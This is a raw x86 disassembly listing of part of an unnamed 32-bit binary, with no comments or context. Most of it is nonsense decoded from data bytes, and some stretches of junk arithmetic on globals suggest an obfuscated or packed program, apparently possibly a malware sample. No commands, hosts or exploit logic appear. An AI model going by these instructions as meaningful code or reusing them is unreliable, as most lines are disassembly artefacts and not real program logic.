  40a527:	arpl   si,di
  40a529:	loop   0x40a541
  40a52b:	mov    dh,0x73
  40a52d:	sub    eax,0x306c5846
  40a532:	inc    ebx
  40a533:	xchg   ecx,eax
  40a534:	xor    cl,dl
  40a536:	mov    eax,DWORD PTR [ebx-0x4b]
  40a539:	aam    0x1c
  40a53b:	ja     0x40a4d2
  40a53d:	jne    0x40a5b1
  40a53f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a540:	cmp    esi,ecx
  40a542:	pusha  
  40a543:	fmul   DWORD PTR [ecx]
  40a545:	cmp    al,0x87
  40a547:	pop    ebp
  40a548:	pusha  
  40a549:	outs   dx,DWORD PTR ds:[esi]
  40a54a:	mov    WORD PTR ds:0x7373fce9,?
  40a550:	and    al,0xae
  40a552:	pusha  
  40a553:	std    
  40a554:	je     0x40a5b6
  40a556:	pusha  
  40a557:	bound  ebx,QWORD PTR [ebp-0x3378574d]
  40a55d:	pop    ss
  40a55e:	xchg   ebp,eax
  40a55f:	dec    eax
  40a560:	lock outs dx,BYTE PTR ds:[esi]
  40a562:	ret    
  40a563:	pop    ecx
  40a564:	scas   eax,DWORD PTR es:[edi]
  40a565:	xor    cl,BYTE PTR [esi-0xcb4d412]
  40a56b:	aaa    
  40a56c:	cmp    cl,BYTE PTR ds:0xcd00bb8b
  40a572:	mov    eax,0x77d2b967
  40a577:	xchg   ebp,eax
  40a579:	and    al,0xe5
  40a57b:	xor    DWORD PTR [ecx+0x37],esi
  40a57e:	xor    eax,0xa8d0d9c6
  40a583:	gs retfw 0xbae1
  40a588:	fisubr DWORD PTR [ecx+0x4c00e3b3]
  40a58e:	xor    BYTE PTR ds:0xa5974332,bl
  40a594:	jno    0x40a5eb
  40a596:	out    dx,eax
  40a597:	jnp    0x40a5cd
  40a599:	push   ebx
  40a59a:	stos   BYTE PTR es:[edi],al
  40a59b:	jmp    0x4029:0x232ee015
  40a5a2:	data16 (bad) 
  40a5a4:	jecxz  0x40a55c
  40a5a6:	ror    DWORD PTR [edx],0x64
  40a5a9:	ror    DWORD PTR [ebx-0x21],0xb
  40a5ad:	das    
  40a5ae:	stc    
  40a5af:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40a5b1:	xchg   BYTE PTR [esi+0x2],cl
  40a5b4:	fbld   TBYTE PTR [ecx-0x771b2265]
  40a5ba:	sbb    bl,BYTE PTR [eax-0x76]
  40a5bd:	xor    dl,ah
  40a5bf:	pop    ecx
  40a5c0:	push   esi
  40a5c1:	push   cs
  40a5c2:	xchg   edi,eax
  40a5c3:	push   ss
  40a5c4:	icebp  
  40a5c5:	add    al,0xfc
  40a5c7:	retf   0xb919
  40a5ca:	fs inc ebx
  40a5cc:	daa    
  40a5cd:	jne    0x40a633
  40a5cf:	sbb    eax,0xf60d7adf
  40a5d4:	repz pop ebx
  40a5d6:	and    BYTE PTR [edi+0x34],al
  40a5d9:	daa    
  40a5da:	and    ebp,DWORD PTR [edi+0x344c6cda]
  40a5e0:	sbb    BYTE PTR [ebp-0x3d],ah
  40a5e3:	mov    ds:0x1ee603e2,eax
  40a5e8:	mov    edi,0x6a1f9fc7
  40a5ed:	mov    ds:0x2aec5377,al
  40a5f2:	sub    edi,DWORD PTR gs:[eax-0x3a]
  40a5f6:	or     BYTE PTR [esi+0x26],al
  40a5f9:	stos   BYTE PTR es:[edi],al
  40a5fa:	mov    ebp,0x890be88d
  40a5ff:	popf   
  40a600:	mov    esp,0x3f3093f3
  40a605:	out    dx,al
  40a606:	lock sub bl,BYTE PTR [ecx-0x31880b46]
  40a60d:	jecxz  0x40a5f8
  40a60f:	jg     0x40a60c
  40a611:	pop    eax
  40a612:	and    ebp,DWORD PTR [eax+edx*2]
  40a615:	and    al,0xe2
  40a617:	inc    edx
  40a618:	push   ebx
  40a619:	dec    eax
  40a61a:	mov    DWORD PTR [eax-0x7df4c4d],0xaf67a4f8
  40a624:	sahf   
  40a625:	lods   al,BYTE PTR ds:[esi]
  40a626:	sub    dh,BYTE PTR [eax-0x37]
  40a629:	outs   dx,BYTE PTR fs:[esi]
  40a62b:	clc    
  40a62c:	xchg   DWORD PTR [eax+0x23baff29],esi
  40a632:	ja     0x40a698
  40a634:	jg     0x40a685
  40a636:	cdq    
  40a637:	push   0xffffffe0
  40a639:	sbb    BYTE PTR [ebx+0x5a25a0f7],dh
  40a63f:	mov    al,al
  40a641:	retf   0x8945
  40a644:	add    BYTE PTR [esi-0x51666294],cl
  40a64a:	rcl    dl,1
  40a64c:	pop    ss
  40a64d:	(bad)  
  40a64e:	fsub   QWORD PTR [eax+0x57f0d3fd]
  40a654:	fadd   DWORD PTR [esi-0x2ad0a610]
  40a65a:	pop    es
  40a65b:	inc    ebp
  40a65c:	push   ebp
  40a65d:	and    edi,edi
  40a65f:	add    dh,BYTE PTR [edi]
  40a661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a662:	cdq    
  40a663:	cdq    
  40a664:	pop    ss
  40a665:	lahf   
  40a666:	ret    
  40a667:	fcom   QWORD PTR [edi+0x2e]
  40a66a:	cmp    BYTE PTR [esi-0x27],bl
  40a66d:	add    ch,dh
  40a66f:	dec    edx
  40a670:	lods   eax,DWORD PTR ds:[esi]
  40a671:	push   0xffffffc0
  40a673:	adc    DWORD PTR [edx+0xc35bc83],edx
  40a679:	xchg   edx,eax
  40a67a:	mov    esp,0xb05fbb9d
  40a67f:	test   eax,0x23ac0601
  40a684:	mov    dl,0x98
  40a686:	mov    ds:0x7a824efa,al
  40a68b:	cmp    cl,dh
  40a68d:	jl     0x40a615
  40a68f:	nop
  40a690:	pushf  
  40a691:	and    bl,BYTE PTR [ecx]
  40a693:	rol    DWORD PTR [eax+eax*8-0x38fba52d],cl
  40a69a:	outs   dx,DWORD PTR ds:[esi]
  40a69b:	inc    eax
  40a69c:	add    eax,0x42ff00e0
  40a6a1:	lea    ebp,[edi-0xf32363b]
  40a6a7:	pop    eax
  40a6a8:	and    al,0x9d
  40a6aa:	aas    
  40a6ab:	dec    ebp
  40a6ac:	dec    eax
  40a6ad:	fcomp  st(5)
  40a6af:	sub    DWORD PTR [edi],esp
  40a6b1:	fs push ebx
  40a6b3:	loop   0x40a6bc
  40a6b5:	push   edi
  40a6b6:	lds    eax,FWORD PTR [ebp+0x4ba5f9a8]
  40a6bc:	push   ebx
  40a6bd:	add    BYTE PTR [edx],dl
  40a6bf:	mov    ecx,0x2c27fcf8
  40a6c4:	adc    DWORD PTR [edi],edx
  40a6c6:	sbb    BYTE PTR [ebp-0x16],ch
  40a6c9:	hlt    
  40a6ca:	repz loop 0x40a654
  40a6cd:	sbb    cl,bl
  40a6cf:	das    
  40a6d0:	fisubr DWORD PTR [ecx-0x7a]
  40a6d3:	jmp    0x8f897f3d
  40a6d8:	cwde   
  40a6d9:	mov    eax,ds:0xd6901d35
  40a6de:	ret    0xf8a3
  40a6e1:	push   ds
  40a6e2:	ds dec ebx
  40a6e4:	pop    es
  40a6e5:	and    DWORD PTR [eax-0x7a],ebx
  40a6e8:	mov    ss,WORD PTR [edi+0x3b74e248]
  40a6ee:	clc    
  40a6ef:	mov    DWORD PTR ds:0x4336eb,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x4336d7,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x433767,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433797
  40a72f:	or     DWORD PTR ds:0x4337a3,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433793,0x433687
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x43372f,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x4336e7,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x43376f,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x43367f,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x43375b
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43368b
  40a793:	sub    DWORD PTR ds:0x4336a3,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0x27c7ec0c
  40a7ac:	leave  
  40a7ad:	clc    
  40a7ae:	push   ss
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	and    BYTE PTR [ebx+0x3b],0x90
  40a7ba:	pop    ebx
  40a7bb:	mov    esi,0xf9669a27
  40a7c0:	inc    ebx
  40a7c1:	setne  BYTE PTR [ebp-0x2bc54e24]
  40a7c8:	sbb    al,BYTE PTR [esi+0x797c5e23]
  40a7ce:	pop    ecx
  40a7cf:	or     eax,0x66d924ab
  40a7d4:	sbb    DWORD PTR ds:0x3fc9dce3,ebx
  40a7da:	daa    
  40a7db:	jbe    0x40a856
  40a7dd:	xchg   BYTE PTR [ebx],al
  40a7df:	and    BYTE PTR [edx-0x50bb325],dl
  40a7e5:	cmp    al,0xc3
  40a7e7:	add    al,0xa
  40a7e9:	ret    
  40a7ea:	rol    DWORD PTR [ebx+0x57],0x18
  40a7ee:	push   esp
  40a7ef:	ret    
  40a7f0:	mov    eax,ds:0xb732c60e
  40a7f5:	repnz hlt 
  40a7f7:	jne    0x40a79f
  40a7f9:	and    al,0x51
  40a7fb:	(bad)  
  40a7fc:	mov    BYTE PTR [eax-0x9fe38a],dl
  40a802:	mov    bh,cl
  40a804:	xor    DWORD PTR [eax],0x3d
  40a807:	sub    BYTE PTR [ebp+0x37],al
  40a80a:	jno    0x40a846
  40a80c:	jo     0x40a81d
  40a80e:	xor    DWORD PTR [ecx+0x3c],edx
  40a811:	push   ds
  40a812:	cmp    ch,BYTE PTR [ebp-0x1d]
  40a815:	add    BYTE PTR [eiz*8-0x67cd8d3a],ah
  40a81c:	mov    esi,0x718542ef
  40a821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a822:	daa    
  40a823:	dec    eax
  40a824:	or     edi,0xfffffff9
  40a827:	dec    edi
  40a828:	daa    
  40a829:	call   0x2d1d:0x48181c5c
  40a830:	sahf   
  40a831:	add    al,0xd0
  40a833:	scas   al,BYTE PTR es:[edi]
  40a834:	rcl    BYTE PTR [edi],0xd0
  40a837:	ins    BYTE PTR es:[edi],dx
  40a838:	out    0xbc,al
  40a83a:	cmc    
  40a83b:	inc    DWORD PTR [ecx-0x2e]
  40a83e:	addr16 and bl,dh
  40a841:	jno    0x40a872
  40a843:	xchg   edi,eax
  40a844:	(bad)  
  40a845:	pop    eax
  40a846:	adc    DWORD PTR [eiz*8+0x7ccbc320],esp
  40a84d:	add    DWORD PTR [edx],esp
  40a84f:	repz repnz mov ebp,0x39715c47
  40a856:	mov    ah,0xe6
  40a858:	shl    DWORD PTR [ecx],0xd7
  40a85b:	js     0x40a82c
  40a85d:	outs   dx,DWORD PTR ds:[esi]
  40a85e:	retf   0x7058
  40a861:	repz mov ebp,0xbcc5031e
  40a867:	imul   ebx,DWORD PTR [eax-0x68591ea7],0x32a9c07b
  40a871:	xchg   edx,eax
  40a872:	xor    bh,BYTE PTR [esp+eax*2+0x754c5df1]
  40a879:	jl     0x40a8b4
  40a87b:	sbb    edx,DWORD PTR [esi-0x44]
  40a87e:	xchg   ebp,eax
  40a87f:	mov    ebx,0x7b71f3c3
  40a884:	ins    BYTE PTR es:[edi],dx
  40a885:	fld    TBYTE PTR [esi-0x4]
  40a888:	mov    edx,0x8c1fc225
  40a88d:	test   al,0x31
  40a88f:	sub    esp,DWORD PTR [ebp+0x3a]
  40a892:	pop    ds
  40a893:	jge    0x40a8b2
  40a895:	outs   dx,DWORD PTR ds:[esi]
  40a896:	loop   0x40a8d1
  40a898:	cmp    ebx,DWORD PTR [edx]
  40a89a:	retf   
  40a89b:	and    DWORD PTR [eax+0x32cc38c1],0x6e
  40a8a2:	pop    eax
  40a8a3:	and    ch,BYTE PTR [edi+0x2f]
  40a8a6:	xchg   ebp,eax
  40a8a7:	xchg   ebp,eax
  40a8a8:	push   esp
  40a8a9:	jl     0x40a902
  40a8ab:	push   edi
  40a8ac:	push   edx
  40a8ad:	dec    edx
  40a8ae:	dec    esp
  40a8af:	pop    ebx
  40a8b0:	outs   dx,DWORD PTR ds:[esi]
  40a8b1:	ror    BYTE PTR [ebx],0xda
  40a8b4:	or     bh,ah
  40a8b6:	sbb    al,0xd2
  40a8b8:	or     ch,cl
  40a8ba:	mov    ecx,0x703d76d2
  40a8bf:	push   ebx
  40a8c0:	mov    ebx,0xdd852ea1
  40a8c5:	stos   BYTE PTR es:[edi],al
  40a8c6:	and    cl,ah
  40a8c8:	pop    edi
  40a8c9:	icebp  
  40a8ca:	push   cs
  40a8cb:	ss mov ebp,cs
  40a8ce:	and    DWORD PTR [ebp+0x16],0x79
  40a8d2:	mov    ebp,0xf625b8fd
  40a8d7:	mov    WORD PTR [ecx-0x3bcf4f2],ds
  40a8dd:	dec    ecx
  40a8de:	pop    eax
  40a8df:	lea    eax,ds:[ebx+0x6]
  40a8e3:	cmp    BYTE PTR [ebp+0x12],0xf5
  40a8e7:	or     edi,DWORD PTR [ebp+0x2163b34c]
  40a8ed:	gs cdq 
  40a8ef:	mov    ds:0x76a56fdc,eax
  40a8f4:	xor    dh,BYTE PTR [ecx+0x56a119a3]
  40a8fa:	rol    BYTE PTR [edx],cl
  40a8fc:	mov    esi,0xeb75a433
  40a901:	push   cs
  40a902:	mov    ah,0x17
  40a904:	jl     0x40a8a8
  40a906:	mul    bl
  40a908:	and    BYTE PTR [eax+0x2d97964b],bh
  40a90e:	push   cs
  40a90f:	dec    ecx
  40a910:	in     eax,0x6f
  40a912:	or     al,0x5d
  40a914:	shl    al,cl
  40a916:	jge    0x40a8fa
  40a918:	retf   
  40a919:	jne    0x40a8d3
  40a91b:	and    eax,0x1b1689f4
  40a920:	sub    ah,BYTE PTR [ecx]
  40a922:	popf   
  40a923:	xchg   BYTE PTR [esi+0x44],bh
  40a926:	imul   edx,DWORD PTR [edx+ebp*8],0xba565f72
  40a92d:	stos   DWORD PTR es:[edi],eax
  40a92e:	xchg   ebp,eax
  40a92f:	dec    ebp
  40a930:	leave  
  40a931:	pop    ecx
  40a932:	mov    bl,ch
  40a934:	and    edi,0x6
  40a937:	jg     0x40a910
  40a939:	daa    
  40a93a:	jo     0x40a98e
  40a93c:	iret   
  40a93d:	leave  
  40a93e:	pop    ebp
  40a93f:	outs   dx,DWORD PTR ds:[esi]
  40a940:	call   0x6025:0xb20c25c3
  40a947:	xchg   esi,eax
  40a948:	fsubr  st,st(5)
  40a94a:	or     ebx,DWORD PTR [edx]
  40a94c:	sti    
  40a94d:	mov    DWORD PTR [eax+0x39],esi
  40a950:	add    ah,BYTE PTR [ecx]
  40a952:	cld    
  40a953:	enter  0xfe6d,0xc5
  40a957:	into   
  40a958:	sub    bl,al
  40a95a:	adc    eax,0x4f1b1393
  40a95f:	pop    edi
  40a960:	xchg   ebx,eax
  40a961:	stos   BYTE PTR es:[edi],al
  40a962:	lods   al,BYTE PTR ds:[esi]
  40a963:	adc    al,0xb9
  40a965:	inc    esi
  40a966:	mov    cl,0xf6
  40a968:	mov    ah,0xc4
  40a96a:	rcl    BYTE PTR [eax+0x596f8598],0xde
  40a971:	nop
  40a972:	jne    0x40a9b7
  40a974:	or     BYTE PTR [edx+0x4e],dl
  40a977:	jnp    0x40a95e
  40a979:	xchg   esp,eax
  40a97a:	or     ah,BYTE PTR [edx-0x3e]
  40a97d:	out    dx,eax
  40a97e:	(bad)  
  40a97f:	jge    0x40a92a
  40a981:	jns    0x40a924
  40a983:	push   ebp
  40a984:	push   esp
  40a985:	xchg   edi,eax
  40a986:	nop
  40a987:	adc    BYTE PTR [ebx+0x5],dl
  40a98a:	sbb    ecx,DWORD PTR [edi+0x7a245147]
  40a990:	pop    es
  40a991:	jbe    0x40a981
  40a993:	stos   BYTE PTR es:[edi],al
  40a994:	cmp    bh,al
  40a996:	dec    eax
  40a997:	addr16 addr16 cwde 
  40a99a:	enter  0xb9ca,0x40
  40a99e:	aam    0x4a
  40a9a0:	sbb    al,ah
  40a9a2:	retf   
  40a9a3:	xor    ah,BYTE PTR [edi]
  40a9a5:	sub    eax,0x3828e917
  40a9aa:	sub    ebp,DWORD PTR [eax]
  40a9ac:	xchg   edi,eax
  40a9ad:	ja     0x40aa1c
  40a9af:	pop    ebx
  40a9b0:	inc    esp
  40a9b1:	popa   
  40a9b2:	inc    edi
  40a9b3:	pop    es
  40a9b4:	jbe    0x40a964
  40a9b6:	mov    ebp,0x47030f03
  40a9bb:	mov    cs,WORD PTR [edi]
  40a9bd:	mov    ds:0xaad8565e,al
  40a9c2:	retf   
  40a9c3:	dec    esi
  40a9c4:	pop    ebx
  40a9c5:	cmp    edx,ecx
  40a9c7:	sbb    al,0x4d
  40a9c9:	push   eax
  40a9ca:	xor    al,0xb7
  40a9cc:	inc    ebp
  40a9cd:	inc    esp
  40a9ce:	in     eax,dx
  40a9cf:	push   cs
  40a9d0:	mov    bl,0x2
  40a9d2:	mov    ah,0x58
  40a9d4:	sbb    al,0xd6
  40a9d6:	xchg   ecx,edi
  40a9d8:	jnp    0x40a97d
  40a9da:	aad    0x3f
  40a9dc:	sbb    al,0x17
  40a9de:	out    dx,al
  40a9df:	pop    esp
  40a9e0:	inc    ecx
  40a9e1:	xchg   ebx,eax
  40a9e2:	xchg   esi,eax
  40a9e3:	and    DWORD PTR [ebx+0x6d],esi
  40a9e6:	mov    dh,0x94
  40a9e8:	rcl    DWORD PTR [ebx-0x3f70988],1
  40a9ee:	push   0x7c
  40a9f0:	mov    edi,DWORD PTR [esi]
  40a9f2:	lods   eax,DWORD PTR ds:[esi]
  40a9f3:	loopne 0x40aa55
  40a9f5:	push   eax
  40a9f6:	or     DWORD PTR [edx],edx
  40a9f8:	mov    db1,ebx
  40a9fb:	or     DWORD PTR [ecx+0x458bec45],0xfffffffc
  40aa02:	xor    DWORD PTR ds:0x433697,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433797,0x433767
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x4336e7,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	aaa    
  40aa35:	sbb    al,0xb2
  40aa37:	aam    0xd0
  40aa39:	jmp    0x40aab9
  40aa3b:	jle    0x40aa75
  40aa3d:	jl     0x40aabd
  40aa3f:	jle    0x40a9ea
  40aa41:	mov    dl,0x2c
  40aa43:	js     0x40a9f2
  40aa45:	mov    ch,0xa8
  40aa47:	pop    ebp
  40aa48:	inc    ebp
  40aa49:	mov    dl,0xf5
  40aa4b:	sti    
  40aa4c:	fwait
  40aa4d:	xor    al,0xbf
  40aa4f:	mov    ebx,0xde027f0
  40aa54:	xchg   esi,eax
  40aa55:	push   edi
  40aa56:	mov    esi,es
  40aa58:	pop    es
  40aa59:	sbb    bh,cl
  40aa5b:	test   BYTE PTR [edx],0x76
  40aa5e:	pop    ecx
  40aa5f:	or     BYTE PTR ds:0xc445f95,dl
  40aa65:	cmp    BYTE PTR [eax+0x1b4e42a8],ah
  40aa6b:	pushf  
  40aa6c:	and    BYTE PTR [ebp-0x7d],bh
  40aa6f:	das    
  40aa70:	cmp    al,0xf6
  40aa72:	cmp    edi,DWORD PTR [edx-0x53]
  40aa75:	popw   ss
  40aa77:	enter  0x2fe7,0x73
  40aa7b:	lods   al,BYTE PTR ds:[esi]
  40aa7c:	fbstp  TBYTE PTR [ecx-0x4abbfdf0]
  40aa82:	dec    esi
  40aa83:	add    ch,dl
  40aa85:	adc    cl,BYTE PTR [ebp+ebx*8+0x24]
  40aa89:	mov    ebx,0x21caaf8d
  40aa8e:	jmp    0x43fa:0xc4a7596a
  40aa95:	idiv   DWORD PTR [edi-0x155725f0]
  40aa9b:	js     0x40aa36
  40aa9d:	sbb    eax,0x3e2ad916
  40aaa2:	test   BYTE PTR [edx],bh
  40aaa4:	repz lahf 
  40aaa6:	pop    esi
  40aaa7:	rol    BYTE PTR [edi],1
  40aaa9:	mov    bh,BYTE PTR [ebx+0x3a]
  40aaac:	jle    0x40aaf8
  40aaae:	xor    ebp,DWORD PTR [edi-0x41]
  40aab1:	pop    ds
  40aab2:	mov    fs,WORD PTR [eax]
  40aab4:	je     0x40ab06
  40aab6:	ins    DWORD PTR es:[edi],dx
  40aab7:	inc    eax
  40aab8:	(bad)  
  40aab9:	cmp    al,0x57
  40aabb:	retf   
  40aabc:	jae    0x40aa64
  40aabe:	scas   eax,DWORD PTR es:[edi]
  40aabf:	jmp    0xd21e9555
  40aac4:	xchg   ebx,eax
  40aac5:	sbb    al,0x26
  40aac7:	mov    esi,0x9da8e1e4
  40aacc:	sub    BYTE PTR [edx],dh
  40aace:	loope  0x40aa83
  40aad0:	sbb    edi,ebx
  40aad2:	fwait
  40aad3:	sbb    edx,ebp
  40aad5:	xchg   edx,eax
  40aad6:	push   0xc32c0652
  40aadb:	stc    
  40aadc:	popf   
  40aadd:	sti    
  40aade:	dec    esi
  40aadf:	in     al,dx
  40aae0:	jle    0x40aa7a
  40aae2:	pop    ecx
  40aae3:	mov    ebx,0x46ee08df
  40aae8:	sbb    eax,0x7428ba85
  40aaed:	(bad)  
  40aaef:	nop
  40aaf0:	sub    eax,0x8240f1c
  40aaf5:	push   es
  40aaf6:	jp     0x40aaad
  40aaf8:	test   al,0xf4
  40aafa:	sub    al,0x7a
  40aafc:	mov    fs,WORD PTR [edi-0x7ffcf331]
  40ab02:	adc    edi,DWORD PTR ds:0x54543992
  40ab08:	sti    
  40ab09:	pusha  
  40ab0a:	pop    ebp
  40ab0b:	cwde   
  40ab0c:	pop    ss
  40ab0d:	outs   dx,DWORD PTR ds:[esi]
  40ab0e:	add    dh,BYTE PTR [esi+0x77]
  40ab11:	stos   BYTE PTR es:[edi],al
  40ab12:	or     eax,0xdfb87bcb
  40ab17:	js     0x40ab26
  40ab19:	and    ebp,DWORD PTR [edx-0x80]
  40ab1c:	push   ds
  40ab1d:	stc    
  40ab1e:	popf   
  40ab1f:	jae    0x40ab3e
  40ab21:	jp     0x40aaee
  40ab23:	push   cs
  40ab24:	ins    DWORD PTR es:[edi],dx
  40ab25:	clc    
  40ab26:	sbb    DWORD PTR [ecx+eax*4],ebp
  40ab29:	jne    0x40ab9d
  40ab2b:	xlat   BYTE PTR ds:[ebx]
  40ab2c:	sbb    eax,0xbe843d67
  40ab31:	pop    ebp
  40ab32:	shl    BYTE PTR [edi+0xd],0x27
  40ab36:	int3   
  40ab37:	jns    0x40aad6
  40ab39:	dec    esp
  40ab3a:	and    BYTE PTR [ecx],bh
  40ab3c:	push   edi
  40ab3d:	mov    esi,0xbb998c37
  40ab43:	xor    eax,0xe13f3c63
  40ab48:	(bad)  
  40ab49:	fld    TBYTE PTR [eax]
  40ab4b:	(bad)  
  40ab4d:	fwait
  40ab4e:	mov    ch,0xeb
  40ab50:	addr16 test al,0x11
  40ab53:	push   ss
  40ab54:	xor    al,0x81
  40ab56:	xchg   esp,eax
  40ab57:	xor    cl,BYTE PTR [ebp-0x1eebaaaa]
  40ab5d:	gs aaa 
  40ab5f:	je     0x40ab9b
  40ab61:	ret    0xf606
  40ab64:	lods   al,BYTE PTR ds:[esi]
  40ab65:	mov    WORD PTR [edx-0x57],ss
  40ab68:	scas   eax,DWORD PTR es:[edi]
  40ab69:	xchg   edi,eax
  40ab6a:	add    al,0x75
  40ab6c:	inc    edi
  40ab6d:	bound  ebx,QWORD PTR [eax+0x763003b7]
  40ab73:	jl     0x40ab48
  40ab75:	daa    
  40ab76:	mov    BYTE PTR ds:0xd63012e,0x8e
  40ab7d:	out    0xf9,eax
  40ab7f:	or     al,0xd3
  40ab81:	mov    BYTE PTR [edi],al
  40ab83:	retf   
  40ab84:	ds push 0x18031365
  40ab8a:	push   0x79
  40ab8c:	hlt    
  40ab8d:	mov    ebx,0xe4b57f0f
  40ab92:	rol    DWORD PTR [eax],0xab
  40ab95:	in     al,dx
  40ab96:	sbb    dh,dh
  40ab98:	fidivr WORD PTR [eax+0x47]
  40ab9b:	inc    ebp
  40ab9c:	adc    DWORD PTR [eax+0x779ceea3],edi
  40aba2:	lods   al,BYTE PTR ds:[esi]
  40aba3:	es mov dh,0x9c
  40aba6:	ins    BYTE PTR es:[edi],dx
  40aba7:	bnd jle 0x40abb7
  40abaa:	pop    eax
  40abab:	sub    DWORD PTR [ebp-0x2d],eax
  40abae:	mov    ebp,DWORD PTR ds:0x476a
  40abb3:	test   al,0x53
  40abb5:	inc    ecx
  40abb6:	xor    cl,BYTE PTR [ebx]
  40abb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abb9:	or     al,0xbb
  40abbb:	mov    fs,WORD PTR [edi+0x63]
  40abbe:	jbe    0x40ac3b
  40abc0:	dec    ecx
  40abc1:	sbb    BYTE PTR [ecx+0x2d],ch
  40abc4:	pop    ss
  40abc5:	test   eax,0x60501d17
  40abca:	or     esi,DWORD PTR [edx+ebp*2-0x366cbfe0]
  40abd1:	shl    DWORD PTR [eax-0x1b8715a2],1
  40abd7:	je     0x40ac00
  40abd9:	adc    dh,BYTE PTR [esi]
  40abdb:	fs aam 0x41
  40abde:	and    al,0x89
  40abe0:	mov    eax,0x2404f42d
  40abe5:	in     al,0xba
  40abe7:	adc    eax,0xf3594d78
  40abec:	sti    
  40abed:	bswap  edi
  40abef:	fld    DWORD PTR [ebx+0x6f09204f]
  40abf5:	inc    esi
  40abf6:	dec    esp
  40abf7:	test   al,0xcb
  40abf9:	mov    ecx,0x422f5164
  40abfe:	mov    eax,0x671c548e
  40ac03:	jne    0x40abb9
  40ac05:	pop    ebx
  40ac06:	sub    BYTE PTR [ebx-0x105c6bdd],bh
  40ac0c:	pop    ebx
  40ac0d:	and    al,0x2c
  40ac0f:	div    dh
  40ac11:	(bad)  
  40ac12:	fld    DWORD PTR [edi-0x5860e74f]
  40ac18:	pusha  
  40ac19:	test   eax,0xe038a38f
  40ac1e:	scas   al,BYTE PTR es:[edi]
  40ac1f:	mov    ah,0x3a
  40ac21:	jge    0x40ac2b
  40ac23:	mov    esp,0xd30db28d
  40ac28:	mov    WORD PTR [ebp-0x7327abd],ss
  40ac2e:	stos   DWORD PTR es:[edi],eax
  40ac2f:	sti    
  40ac30:	ret    0x393c
  40ac33:	into   
  40ac34:	test   al,0xd1
  40ac36:	shl    DWORD PTR [esi-0x4e396bd0],1
  40ac3c:	repnz fadd DWORD PTR [ebx+0x27]
  40ac40:	and    BYTE PTR [ecx+0x16],al
  40ac43:	sbb    ebp,ebx
  40ac45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac46:	ret    
  40ac47:	sbb    eax,0x12953df9
  40ac4c:	add    esi,DWORD PTR ds:0x892821fc
  40ac52:	cld    
  40ac53:	and    bh,al
  40ac55:	out    dx,eax
  40ac56:	sub    edi,DWORD PTR [edx+0xe]
  40ac59:	xor    ch,BYTE PTR [eax+eiz*8+0x56]
  40ac5d:	mov    eax,ds:0xbaeaf651
  40ac62:	fucomi st,st(0)
  40ac64:	jge    0x40ac3c
  40ac66:	ins    DWORD PTR es:[edi],dx
  40ac67:	dec    ecx
  40ac68:	call   0x9b77eebf
  40ac6d:	jg     0x40aca5
  40ac6f:	mov    edx,0x24bb98fe
  40ac74:	add    BYTE PTR [eax+esi*4-0x2040d19c],bh
  40ac7b:	xchg   edx,eax
  40ac7c:	jecxz  0x40ac1d
  40ac7e:	add    ebp,DWORD PTR [edx-0x3144457a]
  40ac84:	lahf   
  40ac85:	aas    
  40ac86:	cmp    ecx,eax
  40ac88:	je     0x40b9ed
  40ac8e:	sbb    DWORD PTR ds:0x4336eb,0x7413
  40ac98:	mov    eax,DWORD PTR [ebp-0x14]
  40ac9b:	and    DWORD PTR ds:0x43376f,0x0
  40aca5:	xor    ecx,ecx
  40aca7:	or     ecx,DWORD PTR ds:0x43376f
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x43376f,ecx
  40acb4:	cmp    DWORD PTR ds:0x43376f,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433808
  40acc6:	push   0x43384c
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x43376f,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x43376f
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x43376f,ecx
  40acf7:	cmp    DWORD PTR ds:0x43376f,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43371f,0xf8d
  40ad0e:	jmp    0x40af71
